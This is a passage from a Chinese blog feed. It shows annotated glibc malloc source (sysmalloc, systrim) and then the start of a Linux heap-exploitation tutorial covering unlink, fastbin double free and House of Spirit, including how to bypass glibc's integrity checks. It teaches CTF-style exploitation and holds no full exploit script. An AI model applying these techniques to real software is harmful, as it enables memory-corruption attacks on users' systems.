这会保持先前调用的页对齐。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      size = ALIGN_UP(size, pagesize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         如果参数太大，看起来是负的，不尝试调用MORECORE。</span></span><br><span class="line"><span class="comment">         注意，由于mmap接受size_t参数，即使我们无法调用MORECORE，</span></span><br><span class="line"><span class="comment">         下面如果使用mmap，也可能成功。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          brk = (<span class="type">char</span> *)(MORECORE(size));</span><br><span class="line">          LIBC_PROBE(memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">/* 必要时调用 morecore hook 。 */</span></span><br><span class="line">          <span class="type">void</span> (*hook)(<span class="type">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">              (*hook)();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             如果有mmap，尝试使用它作为MORECORE失败或不能使用时的后备。</span></span><br><span class="line"><span class="comment">             在地址空间有“洞”的系统上，这是值得做的，</span></span><br><span class="line"><span class="comment">             所以sbrk不能扩展以提供连续的空间，但空间在其他地方是可用的。</span></span><br><span class="line"><span class="comment">             注意我们忽略了mmap最大计数和阈值限制，</span></span><br><span class="line"><span class="comment">             因为空间将不会被用作分离的mmap区域。</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* 不能与旧的top合并，所以加回它的大小 */</span></span><br><span class="line">          <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">              size = ALIGN_UP(size + old_size, pagesize);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* 如果我们依赖mmap作为后备，那么使用更大的单位 */</span></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(MMAP_AS_MORECORE_SIZE))</span><br><span class="line">              size = MMAP_AS_MORECORE_SIZE;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="type">char</span> *mbrk = (<span class="type">char</span> *)(MMAP(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (mbrk != MAP_FAILED)</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="comment">/* 我们不需要也不能使用另一个sbrk调用来找到结束 */</span></span><br><span class="line">                  brk = mbrk;</span><br><span class="line">                  snd_brk = brk + size;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     记录我们不再有一个连续的sbrk区域。</span></span><br><span class="line"><span class="comment">                     第一次使用mmap作为后备后，我们不再依赖连续的空间，</span></span><br><span class="line"><span class="comment">                     因为这可能会错误地连接区域。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line">                  set_noncontiguous(av);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">              mp_.sbrk_base = brk;</span><br><span class="line">          av-&gt;system_mem += size;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             如果MORECORE扩展了前一个空间，我们可以同样扩展top大小。</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">              set_head(old_top, (size + old_size) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (contiguous(av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">              &#123;</span><br><span class="line">                  malloc_printerr(<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk, av);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             否则，做出调整:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 如果是第一次通过或不连续，我们需要调用sbrk</span></span><br><span class="line"><span class="comment">              只是为了找出内存的结束在哪里。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 我们需要确保所有从malloc返回的内存块都满足</span></span><br><span class="line"><span class="comment">              MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 如果有一个干预的外部sbrk，我们需要调整sbrk</span></span><br><span class="line"><span class="comment">              请求大小以考虑到我们将无法与old_top中的现有空间合并。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 几乎所有系统在内部都以整页为单位分配，</span></span><br><span class="line"><span class="comment">              在这种情况下，我们最好使用请求的最后一页。</span></span><br><span class="line"><span class="comment">              所以我们现在分配足够多的内存来达到页面边界，</span></span><br><span class="line"><span class="comment">              这反过来会导致未来连续的调用进行页面对齐。</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">              front_misalign = <span class="number">0</span>;</span><br><span class="line">              end_misalign = <span class="number">0</span>;</span><br><span class="line">              correction = <span class="number">0</span>;</span><br><span class="line">              aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 处理连续情况 */</span></span><br><span class="line">              <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="comment">/* 计算外部sbrk作为system_mem。 */</span></span><br><span class="line">                  <span class="keyword">if</span> (old_size)</span><br><span class="line">                      av-&gt;system_mem += brk - old_end;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* 确保第一个新区块符合对齐要求 */</span></span><br><span class="line"></span><br><span class="line">                  front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                  <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         跳过一些字节以达到一个对齐的位置。</span></span><br><span class="line"><span class="comment">                         我们不需要特别标记这些浪费的前端字节。</span></span><br><span class="line"><span class="comment">                         它们永远不会被访问到，因为</span></span><br><span class="line"><span class="comment">                         av-&gt;top的prev_inuse（以及任何从它的开始创建的区块）</span></span><br><span class="line"><span class="comment">                         在初始化后总是为真。</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line"></span><br><span class="line">                      correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                      aligned_brk += correction;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     如果这不是与现有空间相邻的，那么我们将无法</span></span><br><span class="line"><span class="comment">                     与old_top空间合并，所以必须在第二个请求中加上这部分。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                  correction += old_size;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* 扩展结束地址以达到页面边界 */</span></span><br><span class="line">                  end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);</span><br><span class="line">                  correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</span><br><span class="line"></span><br><span class="line">                  assert(correction &gt;= <span class="number">0</span>);</span><br><span class="line">                  snd_brk = (<span class="type">char</span> *)(MORECORE(correction));</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     如果不能分配修正空间，尝试至少找出当前的brk。</span></span><br><span class="line"><span class="comment">                     它可能足以继续进行而不会失败。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                     注意如果第二个sbrk没有失败，我们假设空间与第一个sbrk连续。</span></span><br><span class="line"><span class="comment">                     这是一个安全的假设，除非程序是多线程的但不使用锁，</span></span><br><span class="line"><span class="comment">                     并且在我们的第一个和第二个调用之间发生了一个外部的sbrk。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">                  &#123;</span><br><span class="line">                      correction = <span class="number">0</span>;</span><br><span class="line">                      snd_brk = (<span class="type">char</span> *)(MORECORE(<span class="number">0</span>));</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="comment">/* 必要时调用 morecore hook 。 */</span></span><br><span class="line">                      <span class="type">void</span> (*hook)(<span class="type">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">                      <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                          (*hook)();</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 处理非连续情况 */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">                      <span class="comment">/* MORECORE/mmap必须正确对齐 */</span></span><br><span class="line">                      assert(((<span class="type">unsigned</span> <span class="type">long</span>)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                      <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                      &#123;</span><br><span class="line">                          <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             跳过一些字节以达到一个对齐的位置。</span></span><br><span class="line"><span class="comment">                             我们不需要特别标记这些浪费的前端字节。</span></span><br><span class="line"><span class="comment">                             它们永远不会被访问到，因为</span></span><br><span class="line"><span class="comment">                             av-&gt;top的prev_inuse（以及任何从它的开始创建的区块）</span></span><br><span class="line"><span class="comment">                             在初始化后总是为真。</span></span><br><span class="line"><span class="comment">                           */</span></span><br><span class="line"></span><br><span class="line">                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* 找出当前的内存结束位置 */</span></span><br><span class="line">                  <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">                  &#123;</span><br><span class="line">                      snd_brk = (<span class="type">char</span> *)(MORECORE(<span class="number">0</span>));</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 根据第二个sbrk的结果调整top */</span></span><br><span class="line">              <span class="keyword">if</span> (snd_brk != (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">              &#123;</span><br><span class="line">                  av-&gt;top = (mchunkptr)aligned_brk;</span><br><span class="line">                  set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">                  av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     如果不是第一次通过，我们要么有一个由于外部sbrk造成的间隙，</span></span><br><span class="line"><span class="comment">                     要么是一个非连续的区域。在old_top处插入一个双重栅栏防止合并</span></span><br><span class="line"><span class="comment">                     我们不拥有的空间。这些栅栏是标记为使用中的人工区块，</span></span><br><span class="line"><span class="comment">                     无论如何都太小而不能使用。我们需要两个栅栏以使大小和对齐工作。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span> (old_size != <span class="number">0</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         缩小old_top以插入栅栏，保持大小为MALLOC_ALIGNMENT的倍数。</span></span><br><span class="line"><span class="comment">                         我们知道old_top中至少有足够的空间来做到这一点。</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                      old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">                      set_head(old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">                      <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         注意以下分配会完全覆盖old_top，</span></span><br><span class="line"><span class="comment">                         当old_size之前是MINSIZE时。这是故意的。</span></span><br><span class="line"><span class="comment">                         我们需要栅栏，即使old_top可能会因此丢失。</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                      chunk_at_offset(old_top, old_size)-&gt;size =</span><br><span class="line">                          (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                      chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">                          (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">/* 如果可能，释放其余的部分。 */</span></span><br><span class="line">                      <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">                      &#123;</span><br><span class="line">                          _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; <span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新最大系统内存使用量。</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)av-&gt;system_mem &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(av-&gt;max_system_mem))</span><br><span class="line">      av-&gt;max_system_mem = av-&gt;system_mem;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查内存状态。</span></span><br><span class="line">  check_malloc_state(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 最后，执行分配 */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查上述分配路径之一是否成功 */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset(p, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      check_malloced_chunk(av, p, nb);</span><br><span class="line">      <span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 捕获所有失败的路径 */</span></span><br><span class="line">  __set_errno(ENOMEM);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="systrim">systrim</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">systrim</span> <span class="params">(<span class="type">size_t</span> pad, mstate av)</span> &#123;</span><br><span class="line">  <span class="type">long</span> top_size;</span><br><span class="line">  <span class="type">long</span> extra;</span><br><span class="line">  <span class="type">long</span> released;</span><br><span class="line">  <span class="type">char</span> *current_brk;</span><br><span class="line">  <span class="type">char</span> *new_brk;</span><br><span class="line">  <span class="type">size_t</span> pagesize;</span><br><span class="line">  <span class="type">long</span> top_area;</span><br><span class="line"></span><br><span class="line">  pagesize = GLRO (dl_pagesize);</span><br><span class="line">  top_size = chunksize (av-&gt;top);</span><br><span class="line">  top_area = top_size - MINSIZE - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (top_area &lt;= pad)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  extra = ALIGN_DOWN(top_area - pad, pagesize);</span><br><span class="line">  <span class="comment">//计算top chunk中最大可释放的整数页大小,top chunk中至少需要MINSIZE的内存保存fencepost</span></span><br><span class="line">  <span class="keyword">if</span> (extra == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  current_brk = (<span class="type">char</span> *) (MORECORE (<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">if</span> (current_brk == (<span class="type">char</span> *) (av-&gt;top) + top_size) &#123;</span><br><span class="line">    <span class="comment">//如果当前top chunk的结束地址与当前的brk值相等,执行heap收缩</span></span><br><span class="line">    MORECORE (-extra);</span><br><span class="line">    <span class="comment">//调用sbrk释放指定大小的内存</span></span><br><span class="line">    <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">      (*hook)();</span><br><span class="line">    new_brk = (<span class="type">char</span> *) (MORECORE (<span class="number">0</span>));</span><br><span class="line">    LIBC_PROBE (memory_sbrk_less, <span class="number">2</span>, new_brk, extra);</span><br><span class="line">    <span class="keyword">if</span> (new_brk != (<span class="type">char</span> *) MORECORE_FAILURE) &#123;</span><br><span class="line">      <span class="comment">//计算释放的内存大小,更新当前分配区所分配的内存总量,更新top chunk的大小</span></span><br><span class="line">      released = (<span class="type">long</span>) (current_brk - new_brk);</span><br><span class="line">      <span class="keyword">if</span> (released != <span class="number">0</span>) &#123;</span><br><span class="line">        av-&gt;system_mem -= released;</span><br><span class="line">        set_head (av-&gt;top, (top_size - released) | PREV_INUSE);</span><br><span class="line">        check_malloc_state (av);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="版本变化">版本变化</h1>
<h2 id="section">2.24</h2>
<h2 id="section-1">2.25</h2>
<h2 id="section-2">2.27</h2>
<h2 id="section-3">2.28</h2>
<h2 id="section-4">2.29</h2>
]]></content>
  </entry>
  <entry>
    <title>linux 堆利用</title>
    <url>/2024/11/08/linux-heap-exploit/</url>
    <content><![CDATA[<p><a class="link"   href="https://gitcode.net/qq_45323960/debug_glibc" >debug
glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：对于一些复杂的堆利用，可以先用支持源码调试的 libc
完成利用，然后改偏移打题目提供的 libc 。 # Unlink
假设正常情况下，每申请一个 chunk 会保存一个指向该 chunk 内存块的指针。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c24de3948290c69cc25a42ce707dee0e.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                >
在 chunk1 伪造 fake chunk ，需要注意：</p>
<ol type="1">
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                 </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>
<p>令：</p>
<ul>
<li><code>fakeFD -&gt; bk == P1</code> &lt;=&gt;
<code>*(&amp;fakeFD + 0x18) == P1</code> &lt;=&gt;
<code>*fakeFD == &amp;P1 - 0x18</code></li>
<li><code>fakeBK -&gt; fd == P1</code> &lt;=&gt;
<code>*(&amp;fakeBK + 0x10) == P1</code> &lt;=&gt;
<code>*fakeBK == &amp;P1 - 0x10</code></li>
</ul></li>
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">chunksize</span>(P) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(P)), <span class="number">0</span>))   </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);  </span><br></pre></td></tr></table></figure></div>
<p>要将 chunk2 的 prev_size 修改成 fake chunk 的 size。</p></li>
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(P)) &amp;&amp;                                 </span><br><span class="line">    __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                             </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) ||               </span><br><span class="line">        __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))                 </span><br><span class="line">        <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>
<p>fake chunk 大小应在 small bin 范围。</p></li>
<li><p>为了能使得 chunk2 与 fake chunk 合并，chunk2 的 size 的
PREV_INUSE 位 为 0 ，且 chunk2 的大小不能在 fast bin 范围。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/31ad53b15d70e22f7ec4125df5450793.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
释放 chunk2 ，向前合并 fake chunk ，使得 fake chunk 进行 unlink
操作，按如下代码执行，因此 <code>P1 = &amp;P1 - 0x18</code> 。</p>
<ul>
<li><code>FD-&gt;bk = BK</code> &lt;=&gt;
<code>P1 = &amp;P1 - 0x10</code></li>
<li><code>BK-&gt;fd = FD</code> &lt;=&gt;
<code>P1 = &amp;P1 - 0x18</code> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7d5c7910c99de4ad253ff5e77e667dea.png"
                     
alt="在这里插入图片描述" 
                ></li>
</ul></li>
</ol>
<p>至此，整个指针数组被控制，可以实现任意地址读写。 # Fastbin Attack</p>
<h2 id="fastbin-double-free">Fastbin Double Free</h2>
<ul>
<li><p>先释放 chunk1，如果此时再次释放 chunk1 会触发对 double free
的检查：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于只检查链表中第一个 chunk 是否是待释放的 chunk
，因此可以通过先释放 chunk2 再释放 chunk1 绕过。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d9da022304748498ca33674ba391ec2.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p></li>
<li><p>此时 malloc 获取 chunk1 等价于 UAF 漏洞。可以修改 chunk1 的 fd
指针指向特定地址，这样就可以在特定位置申请 chunk
。不过值得注意的是，由于存在如下检查，要保证申请 chunk 位置对应的 size
字段的值是正确的。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">fastbin_index</span>(<span class="built_in">chunksize</span>(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, errstr, <span class="built_in">chunk2mem</span>(victim));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="house-of-spirit">House Of Spirit</h2>
<p>如下图所示，在目标位置处伪造 fastbin
chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/928b3c5c57f4eb0192446216d5e1e16c.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                >
要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的
fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li>fake chunk 的 <code>ISMMAP</code> 位不能为 1，因为 free 时，如果是
mmap 的 chunk，会单独处理。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</span><br><span class="line">        mp_.mmap_threshold = chunksize(p);</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">        LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                   mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">ar_ptr = arena_for_chunk(p);</span><br><span class="line">_int_free(ar_ptr, p, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div></li>
<li>fake chunk 地址需要对齐 <code>MALLOC_ALIGN_MASK</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">       multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div></li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line">	</span><br><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast())</span><br></pre></td></tr></table></figure></div></li>
<li>fake chunk 的 <strong>next chunk</strong> 的大小不能小于
<code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>
